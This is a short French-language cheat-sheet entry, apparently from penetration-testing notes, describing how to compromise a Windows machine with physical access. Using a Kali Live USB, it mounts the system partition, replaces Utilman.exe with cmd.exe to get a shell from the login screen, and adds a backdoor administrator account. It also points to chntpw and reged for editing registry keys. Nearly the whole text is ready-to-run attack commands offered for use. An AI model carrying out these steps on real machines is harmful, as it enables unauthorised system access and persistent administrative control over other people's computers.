# Clé USB Bootable

Brancher une clé USB disposant de Kali Linux Live sur la machine à compromettre :

```
sudo fdisk -l
sudo umount /dev/<PARTITION>
sudo ntfsfix /dev/<PARTITION>
sudo mkdir /mnt/windows
sudo mount /dev/<PARTITION> /mnt/windows
```

Ensuite modifier l'exécutable `Utilman.exe` par `cmd.exe` :

```
sudo cp /mnt/windows/Windows/System32/Utilman.exe /mnt/windows/Windows/System32/Utilman.exe.bak
sudo cp /mnt/windows/Windows/System32/cmd.exe /mnt/windows/Windows/System32/Utilman.exe
```

Redémarrer la machine compromise et ouvrir l'option d'ergonomie. Ajouter un utilisateur :

```
net user admin password /add
net localgroup administrators admin /add
```

#### TIPS

`chntpw` et `reged`peuvent permettre de changer les clés de registre (désactivation de l'auto logon par exemple \[AutoAdminLogon]).
